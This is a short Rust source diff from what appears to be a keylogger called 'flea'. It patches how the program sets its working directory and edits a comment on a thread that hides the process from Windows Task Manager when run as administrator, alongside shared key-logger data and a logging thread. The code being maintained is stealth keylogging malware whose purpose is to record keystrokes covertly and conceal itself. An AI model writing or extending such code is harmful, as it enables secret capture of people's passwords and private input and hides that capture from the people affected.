@@ -47,9 +47,17 @@ fn main()
     let separator = std::path::MAIN_SEPARATOR.to_string();
 
     //remove the file name from the path
-    let program_dir = program_dir.replace(&args[0].split(&separator).last().unwrap(), "");    
-    println!("Program dir: {}", program_dir);
-    env::set_current_dir(&program_dir).unwrap();
+    let mut program_dir = program_dir.replace(&args[0].split(&separator).last().unwrap(), "");    
+    if program_dir.is_empty()
+    {
+        //if the path is empty, set the current directory
+        program_dir = env::current_dir().unwrap().to_str().unwrap().to_string();
+    }
+    else
+    {
+        //set the current directory to the program directory
+        env::set_current_dir(&program_dir).unwrap();
+    }
 
     //Check if backup file exists
     if std::path::Path::new(BACKUP_FILENAME).exists()
@@ -116,7 +124,7 @@ fn main()
         run(current_path, kl);
     });
     
-    //Hide flea process in Task Manager (only on Windows)
+    //Hide flea process in Task Manager (only on Windows. Must be ran as admin)
     let kl2 = Arc::clone(&key_logger_data);
     let handle2 = thread::spawn(move|| {
         flealib::hideflea::hide_flea_process(kl2);
